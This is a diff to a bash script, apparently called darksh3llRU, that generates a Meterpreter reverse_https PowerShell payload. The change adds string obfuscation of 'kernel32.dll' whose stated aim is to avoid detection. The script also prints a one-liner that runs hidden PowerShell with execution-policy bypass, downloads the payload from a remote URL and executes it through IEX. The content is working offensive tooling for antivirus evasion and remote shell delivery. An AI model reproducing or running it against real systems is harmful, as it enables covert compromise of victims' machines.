@@ -1,7 +1,7 @@
 #!/bin/bash
 # shellcode replacement stuff
 # meterpreter PSH-NET payload
-# darksh3llRU v0.5
+# darksh3llRU v0.8
 
 # payload options for staged msfvenom -p windows/x64/meterpreter/reverse_https --list-options
 payload="windows/x64/meterpreter/reverse_https"
@@ -116,6 +116,9 @@ for (( z=0; z <=$shellcode_parts; z++))
 do
     sed -i "2i $junk_string" final_pshnet_revhttps.ps1
 done
+
+# do kernel32.dll things to avoid detection
+sed -i 's,kernel32.dll,ke"+"rn"+"e"+"l"+"32."+"d"+"l"+"l,g' final_pshnet_revhttps.ps1
 
 printf "Final psh-net usage example:\n"
 printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy;\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/final_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
